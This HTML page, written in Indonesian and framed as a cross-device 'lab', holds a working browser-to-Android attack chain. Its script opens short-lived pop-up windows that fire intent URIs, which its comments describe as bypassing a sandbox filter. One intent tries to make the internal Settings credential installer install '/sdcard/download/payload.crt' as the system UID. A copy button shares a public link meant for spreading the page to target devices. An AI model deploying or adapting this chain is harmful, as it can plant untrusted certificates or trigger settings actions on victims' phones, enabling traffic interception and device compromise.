<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Asynchronous Intent Pipeline Lab</title>
<style>
    body {
        font-family: 'Courier New', monospace; 
        padding: 20px; 
        background: #050508; 
        color: #00ffaa;
    }
    h2, h3 { text-transform: uppercase; letter-spacing: 1px; color: #00ffaa; }
    button {
        width: 100%; padding: 18px; margin-top: 12px; 
        background: #0d1a1a; color: #00ffaa; 
        border: 1px solid #00ffaa; font-weight: bold; 
        cursor: pointer; font-size: 13px; text-transform: uppercase;
    }
    button:hover { background: #00ffaa; color: #000; box-shadow: 0 0 15px #00ffaa; }
    .panel {
        border: 1px solid #00ffaa; padding: 15px; 
        margin-bottom: 15px; background: #020c0c;
    }
    #console-log {
        margin-top: 20px; border: 1px solid #00ffaa; padding: 12px; 
        height: 320px; overflow: auto; white-space: pre-wrap; 
        background: #000; font-size: 11px; color: #00ff55;
    }
    .role-tag { font-weight: bold; padding: 2px 6px; border-radius: 3px; font-size: 10px; color: #000; }
    .host { background: #ffaa00; }
    .target { background: #00ffaa; }
</style>
</head>
<body>

<h2>Unified Cross-Device Laboratory</h2>

<div class="panel">
    <h3> Host Control Interface (HP-A)</h3>
    <p>Salin tautan ini di perangkat penguji untuk disebarkan ke perangkat target:</p>
    <button id="copy-deploy-link">Copy Public Deployment Link</button>
</div>

<div class="panel">
    <h3> Target Audit Interface (HP-B)</h3>
    <p>Ketuk tombol eksekusi untuk menguji ketahanan bypass multi-konteks pada peramban target:</p>
    <button id="launch-hardened-pipeline">Execute Hardened Bypass Chain</button>
</div>

<div id="console-log"></div>

<script>
const consoleLog = document.getElementById("console-log");

function writeLog(node, type, text) {
    const timestamp = new Date().toLocaleTimeString();
    let tag = `<span class="role-tag ${type}">${type.toUpperCase()}</span>`;
    consoleLog.innerHTML += `[${timestamp}] [${node}] ${tag} ${text}\n`;
    consoleLog.scrollTop = consoleLog.scrollHeight;
}

function buildIntentUri(action, component = '', extras = {}) {
    let uri = `intent:#Intent;action=${action};`;
    if (component) uri += `component=${component};`;
    
    Object.keys(extras).forEach(key => {
        uri += `S.${key}=${encodeURIComponent(extras[key])};`;
    });
    
    // FLAG_ACTIVITY_NEW_TASK (0x10000000) & FLAG_ACTIVITY_MULTIPLE_TASK (0x08000000)
    // Menjamin pembuatan task baru secara independen di sistem operasi Android
    uri += `launchFlags=0x18000000;category=android.intent.category.DEFAULT;end`;
    return uri;
}

// STRATEGI PENGUATAN: Eksekusi Multi-Konteks (Bypass Sandbox Filter)
function dispatchHardenedNode(uri, label) {
    try {
        // Membuat sub-konteks jendela terisolasi secara asinkron
        const subWindow = window.open("about:blank", "_blank");
        
        if (subWindow) {
            // Mengalihkan lokasi sub-window langsung ke URI Intent
            subWindow.location.href = uri;
            
            // Menutup sub-konteks segera untuk membersihkan tumpukan tab browser
            setTimeout(() => {
                subWindow.close();
            }, 100);
            
            writeLog(label, 'target', `Muatan berhasil dipisahkan ke dalam sub-konteks jendela baru.`);
        } else {
            // Metode cadangan jika deteksi pop-up aktif
            const anchor = document.createElement("a");
            anchor.href = uri;
            anchor.target = "_blank";
            anchor.rel = "noopener noreferrer";
            anchor.click();
            writeLog(label, 'target', `Pop-up diblokir. Menggunakan jalur fallback tab baru.`);
        }
    } catch (e) {
        writeLog(label, 'target', `Gagal eksekusi rantai: ${e.message}`);
    }
}

document.getElementById("copy-deploy-link").addEventListener("click", () => {
    const publicUrl = "https://starty3s.github.io/poc/vids";
    navigator.clipboard.writeText(publicUrl).then(() => {
        writeLog('HOST_ENGINE', 'host', `Tautan publik berhasil disalin: ${publicUrl}`);
    }).catch(err => {
        writeLog('HOST_ENGINE', 'host', `Gagal menyalin: ${err.message}`);
    });
});

// Eksekusi berkecepatan tinggi dengan pemisahan konteks window
document.getElementById("launch-hardened-pipeline").addEventListener("click", () => {
    writeLog('TARGET_INIT', 'target', "Memicu Asynchronous Window Spawning Pipeline...");

    // Tahap 1: Meminta dialog sistem konfirmasi Bluetooth
    const uri1 = buildIntentUri(
        "android.bluetooth.adapter.action.REQUEST_ENABLE",
        "com.android.settings/.bluetooth.RequestEnableActivity"
    );
    dispatchHardenedNode(uri1, 'STAGE-1');

    // Tahap 2: Meneruskan data parameter ekstra ke komponen CredentialsInstaller internal
    const uri2 = buildIntentUri(
        "android.intent.action.VIEW",
        "com.android.settings/.crypto.CredentialsInstaller",
        {
            "install_as_uid": "1000",
            "sys_vulnerable_path": "/sdcard/download/payload.crt"
        }
    );
    dispatchHardenedNode(uri2, 'STAGE-2');

    // Tahap 3: Penyegaran paksa ke Pengaturan Utama
    const uri3 = buildIntentUri("android.settings.SETTINGS");
    dispatchHardenedNode(uri3, 'STAGE-3');

    writeLog('TARGET_FINISH', 'target', "Semua sub-konteks muatan dilepaskan secara paralel.");
});

writeLog('SYSTEM', 'target', "Laboratorium taktis berbasis asinkron siap.");
</script>
</body>
</html>
